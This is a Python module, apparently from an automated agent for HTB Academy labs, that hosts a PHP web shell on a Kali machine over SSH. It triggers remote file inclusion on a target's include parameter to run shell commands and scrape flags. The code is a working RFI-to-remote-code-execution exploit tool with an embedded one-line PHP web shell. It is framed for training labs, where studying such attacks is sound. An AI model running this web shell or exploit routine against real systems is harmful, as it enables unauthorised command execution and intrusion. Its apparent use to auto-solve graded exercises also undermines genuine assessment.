"""Remote File Inclusion (RFI) listener via SSH-attached Kali.

HTB Academy module 23's RFI sections require the operator to host a
malicious PHP file from somewhere the academy target can reach, then
pass that URL into a vulnerable ``include()`` sink. This module runs
that listener on the operator's Kali attacker box over SSH:

  with RfiListener(ssh, listen_ip="10.10.15.54") as listener:
      url = listener.url_for("shell.php")
      # Use url as the ?language=<url>&cmd=id payload via the
      # academy target's HTTP runner. The target fetches our shell,
      # PHP executes it, the response flows back through the LFI
      # response body.

Requirements on the Kali side:
  - python3 in $PATH (used for ``python3 -m http.server``)
  - The chosen ``listen_port`` reachable from the academy target.
    For HTB internal labs that means Kali on the same OpenVPN
    tunnel as the target. For external academy boxes (154.57.x.x)
    it means a Kali host whose IP the target can fetch over the
    public internet, which is unusual; that path needs a reverse
    SSH tunnel and is out of scope here.

Why SSH (not subprocess) on the operator's box:
  - The operator typically runs the agent on Windows; the listener
    must run on Kali. SSH is the existing transport (paramiko is
    already in deps); spawning a Kali container locally doubles
    the install surface.
  - Output cap + per-cmd timeout + no-creds-on-cmdline already
    handled by :class:`htbrl.academy.ssh_runner.SshTargetRunner`.

Safety:
  - The listener tempdir is created under ``/tmp/htbrl-rfi-<random>``
    on Kali so concurrent listeners don't collide.
  - Cleanup runs on context-manager exit *and* if ``open()`` partially
    succeeded then raised - we always try to ``rm -rf`` the tempdir
    and ``kill`` the server PID we recorded.
  - The HTTP server only serves files inside the tempdir (Python's
    built-in ``http.server`` honours its working directory). We
    never expose the operator's home or Kali's filesystem broadly.
"""

from __future__ import annotations

import re
import secrets
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING

if TYPE_CHECKING:  # pragma: no cover
    from htbrl.academy.ssh_runner import SshTargetRunner
    from htbrl.academy.target_runner import HttpResponse, HttpTargetRunner


# Default PHP webshell. ``$_GET[c]`` (unquoted) survives Apache log
# escaping if the operator pivots to log poisoning later. ``cmd`` would
# also work; ``c`` is shorter and matches the academy's own examples.
DEFAULT_SHELL_PHP = "<?php system($_GET['c']); ?>\n"


@dataclass
class RfiListenerInfo:
    """Where the listener is reachable + the payload URLs it serves."""

    base_url: str            # e.g. "http://10.10.15.54:31337"
    tempdir: str             # e.g. "/tmp/htbrl-rfi-aPHe"
    pid: int                 # PID of the python3 http.server on Kali
    payload_filenames: list[str]  # files dropped in tempdir


class RfiListener:
    """Background HTTP server on Kali, hosting RFI payloads.

    Use as a context manager; the listener is torn down (server killed,
    tempdir removed) on exit even if the body raised.

    ``listen_ip`` is the IP the academy target will use to reach the
    Kali host. Often this is the Kali OpenVPN tun0 IP, NOT the SSH
    address (Kali might be SSH-reachable on a LAN-only IP but the
    target box reaches it through the VPN). The listener doesn't bind
    to a specific interface server-side -- ``http.server`` always
    listens on 0.0.0.0 -- but ``listen_ip`` is what we put into
    :meth:`url_for`'s output so the operator's payload uses the right
    URL.
    """

    def __init__(
        self,
        ssh: "SshTargetRunner",
        *,
        listen_ip: str,
        listen_port: int = 0,
        startup_timeout_s: float = 5.0,
        payloads: dict[str, str] | None = None,
    ) -> None:
        self.ssh = ssh
        self.listen_ip = listen_ip
        # 0 means "ask Kali for a free port". For determinism in tests
        # the caller can pin a specific port instead.
        self.listen_port = listen_port
        self.startup_timeout_s = startup_timeout_s
        # Default payload set: a single ``shell.php`` web shell. Callers
        # can override (e.g. multiple shells under different names).
        self.payloads = (
            payloads if payloads is not None else {"shell.php": DEFAULT_SHELL_PHP}
        )
        self._info: RfiListenerInfo | None = None

    # ----- lifecycle ----------------------------------------------------------

    def open(self) -> RfiListenerInfo:
        """Provision the listener on Kali and start ``python3 -m http.server``."""
        if self._info is not None:
            return self._info

        # 1. Make the tempdir. ``mktemp -d`` returns the path on stdout.
        token = secrets.token_hex(4)
        mkdir_cmd = f"mktemp -d /tmp/htbrl-rfi-{token}-XXXX"
        r = self.ssh.run(mkdir_cmd)
        if not r.ok:
            raise RuntimeError(f"RfiListener: mktemp failed: {r.error or r.stderr!r}")
        tempdir = r.stdout.strip().splitlines()[-1].strip()
        if not tempdir.startswith("/tmp/"):
            raise RuntimeError(f"RfiListener: refusing suspicious tempdir {tempdir!r}")

        # 2. Drop each payload file. We use here-doc with a randomly
        #    chosen sentinel so a payload that contains the literal
        #    word "EOF" doesn't terminate the heredoc early.
        for name, body in self.payloads.items():
            if "/" in name or name.startswith("."):
                # Reject names that could traverse out of the tempdir.
                raise ValueError(
                    f"RfiListener: payload filename {name!r} must be a basename"
                )
            sentinel = f"HTBRL_RFI_{secrets.token_hex(4)}"
            cmd = (
                f"cat > {tempdir}/{name} <<'{sentinel}'\n"
                f"{body}"
                f"{sentinel}\n"
            )
            r = self.ssh.run(cmd)
            if not r.ok:
                # Best-effort cleanup before re-raising.
                self.ssh.run(f"rm -rf {tempdir}")
                raise RuntimeError(
                    f"RfiListener: failed to drop {name!r}: {r.error or r.stderr!r}"
                )

        # 3. Pick a port. If listen_port == 0, ask Kali for a free
        #    high port using python's socket trick so we don't race
        #    with another listener.
        port = self.listen_port
        if port == 0:
            r = self.ssh.run(
                "python3 -c "
                "'import socket;s=socket.socket();s.bind((\"0.0.0.0\",0));"
                "print(s.getsockname()[1]);s.close()'"
            )
            if not r.ok:
                self.ssh.run(f"rm -rf {tempdir}")
                raise RuntimeError(
                    f"RfiListener: free-port probe failed: {r.error or r.stderr!r}"
                )
            try:
                port = int(r.stdout.strip())
            except ValueError as exc:
                self.ssh.run(f"rm -rf {tempdir}")
                raise RuntimeError(
                    f"RfiListener: free-port probe returned non-integer: "
                    f"{r.stdout!r}"
                ) from exc

        # 4. Start ``python3 -m http.server`` in the tempdir,
        #    detached from the SSH session so it survives the
        #    transport closing. Capture the PID so we can kill it
        #    on exit.
        start_cmd = (
            f"cd {tempdir} && "
            f"nohup python3 -m http.server {port} --bind 0.0.0.0 "
            f"> /tmp/.htbrl-rfi-{token}.log 2>&1 & "
            f"echo $!"
        )
        r = self.ssh.run(start_cmd)
        if not r.ok:
            self.ssh.run(f"rm -rf {tempdir}")
            raise RuntimeError(
                f"RfiListener: nohup http.server failed: {r.error or r.stderr!r}"
            )
        try:
            pid = int(r.stdout.strip().splitlines()[-1])
        except (ValueError, IndexError) as exc:
            self.ssh.run(f"rm -rf {tempdir}")
            raise RuntimeError(
                f"RfiListener: couldn't parse PID from start output: "
                f"{r.stdout!r}"
            ) from exc

        # 5. Wait for the server to actually accept TCP connections.
        #    nohup returns ~immediately; the python http.server may
        #    take ~200-500 ms to bind on a slow Kali.
        deadline = time.monotonic() + self.startup_timeout_s
        ready = False
        probe_cmd = (
            f"python3 -c 'import socket;s=socket.socket();"
            f"s.settimeout(0.5);"
            f'exit(0) if s.connect_ex(("127.0.0.1",{port}))==0 else exit(1)\''
        )
        while time.monotonic() < deadline:
            r = self.ssh.run(probe_cmd)
            if r.rc == 0:
                ready = True
                break
            time.sleep(0.2)
        if not ready:
            # Tear down so we don't leak the half-started server.
            self.ssh.run(f"kill {pid} 2>/dev/null; rm -rf {tempdir}")
            raise RuntimeError(
                f"RfiListener: server did not accept connections on "
                f"127.0.0.1:{port} within {self.startup_timeout_s}s"
            )

        self._info = RfiListenerInfo(
            base_url=f"http://{self.listen_ip}:{port}",
            tempdir=tempdir,
            pid=pid,
            payload_filenames=list(self.payloads.keys()),
        )
        return self._info

    def close(self) -> None:
        """Kill the http.server, remove the tempdir. Idempotent."""
        if self._info is None:
            return
        # Best-effort: ignore failures so close() never raises.
        try:
            self.ssh.run(
                f"kill {self._info.pid} 2>/dev/null; "
                f"rm -rf {self._info.tempdir}"
            )
        except Exception:
            pass
        self._info = None

    # ----- helpers ------------------------------------------------------------

    def url_for(self, filename: str) -> str:
        """Return the full HTTP URL for one of the dropped payloads."""
        if self._info is None:
            raise RuntimeError("RfiListener: listener not opened yet")
        if filename not in self._info.payload_filenames:
            raise KeyError(
                f"RfiListener: payload {filename!r} not in "
                f"{self._info.payload_filenames!r}"
            )
        return f"{self._info.base_url}/{filename}"

    # ----- context manager ----------------------------------------------------

    def __enter__(self) -> "RfiListener":
        self.open()
        return self

    def __exit__(self, *_) -> None:
        self.close()


# ---- attempt + dispatcher ---------------------------------------------------


@dataclass
class RfiAttempt:
    """One RFI attempt: payload URL + the response we observed."""

    payload_url: str
    body: str = ""
    flag: str | None = None


_FLAG_RE = re.compile(r"HTB\{[^}]+\}")
_RFI_PROMPT_RE = re.compile(
    r"\bRFI\b|"
    r"remote\s+file\s+inclu|"
    r"include.*?from\s+(?:our|your)\s+(?:server|host|listener)|"
    r"host\s+(?:a|our|the)\s+(?:malicious|payload)\s+file",
    re.IGNORECASE | re.DOTALL,
)


def try_rfi_rce(
    http_runner: "HttpTargetRunner",
    listener: RfiListener,
    *,
    param: str = "language",
    cmd: str = "ls /",
    payload_name: str = "shell.php",
    base_path: str = "/index.php",
) -> tuple[str, RfiAttempt]:
    """Trigger the RFI on the academy target via the bound HTTP runner.

    ``param`` is the include sink's query param (``language=`` for
    mod 23, sometimes ``file=``/``page=``). ``cmd`` is the shell
    command to run via ``$_GET[c]`` once the target fetches our
    PHP file.

    Returns ``(stdout, attempt)`` where ``stdout`` is the captured
    command output (empty if the RFI didn't fire) and ``attempt``
    is the URL we triggered + the response chunk we extracted.
    """
    payload_url = listener.url_for(payload_name)
    import urllib.parse as _ul
    qs = _ul.urlencode(
        [(param, payload_url), ("c", cmd)],
        safe=":/?=&",
    )
    resp = http_runner.request(f"{base_path}?{qs}", method="GET")
    body = resp.body_text or ""
    # Pull the answer-bearing slice out of the academy's blog-card.
    m = re.search(
        r"<h2>Containers</h2>(.*?)<p\s+class=\"read-more\"",
        body, re.DOTALL,
    )
    chunk = m.group(1) if m else body
    attempt = RfiAttempt(payload_url=payload_url, body=chunk[:4000])
    flag_m = _FLAG_RE.search(chunk)
    if flag_m:
        attempt.flag = flag_m.group(0)
    return chunk[:4000], attempt


def probe_via_rfi(
    http_runner: "HttpTargetRunner",
    listener: RfiListener,
    question_prompt: str,
    *,
    hints: list[str] | None = None,
    section_code_blocks: list[str] | None = None,
    initial_cmd: str = "find / -name flag* -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -5",
) -> tuple[str, str, float] | None:
    """Detect RFI-shaped questions and trigger the listener.

    Confidence 0.92 -- we trust an actual RCE over heuristics. Returns
    None when the prompt doesn't look like RFI OR when the listener
    didn't yield a flag in the recovered output.

    The probe:
      1. Recognises RFI-style prompts so we don't fire payloads at
         unrelated questions.
      2. Picks the include-sink param name from section code blocks
         (default ``language``).
      3. Triggers the RFI to run ``initial_cmd`` (find flag files);
         if a HTB{} flag appears in the response, returns it.
      4. If output mentions a flag-shaped path, ``cat``s it and
         returns the contents.
    """
    hints_text = " ".join(h for h in (hints or []) if h)
    enriched = (question_prompt or "") + (" " + hints_text if hints_text else "")
    if not _RFI_PROMPT_RE.search(enriched):
        return None

    # Detect the include param name from code blocks.
    param = "language"
    blocks = " ".join(section_code_blocks or [])
    m = re.search(
        r"\?(language|file|page|view|path|include|doc|read|src)\s*=",
        blocks, re.IGNORECASE,
    )
    if m:
        param = m.group(1).lower()

    # Step 1: list candidate flag paths via RFI.
    out, _attempt = try_rfi_rce(
        http_runner, listener, param=param, cmd=initial_cmd,
    )
    flag_m = _FLAG_RE.search(out)
    if flag_m:
        return (
            flag_m.group(0),
            f"RFI listener {listener.url_for('shell.php')!r} ran {initial_cmd!r} "
            f"-> body had {flag_m.group(0)!r}",
            0.92,
        )

    # Step 2: ``cat`` any flag-named paths the find produced.
    paths = re.findall(r"/[\w./\-]*flag[\w./\-]*", out)
    for path in paths[:3]:
        if not path.endswith((".txt", ".log", ".md", "")) and "/" not in path[1:]:
            continue
        cat_cmd = f"cat {path}"
        body, _ = try_rfi_rce(
            http_runner, listener, param=param, cmd=cat_cmd,
        )
        flag_m = _FLAG_RE.search(body)
        if flag_m:
            return (
                flag_m.group(0),
                f"RFI listener -> cat {path} -> {flag_m.group(0)!r}",
                0.92,
            )

    return None


__all__ = [
    "DEFAULT_SHELL_PHP",
    "RfiAttempt",
    "RfiListener",
    "RfiListenerInfo",
    "probe_via_rfi",
    "try_rfi_rce",
]
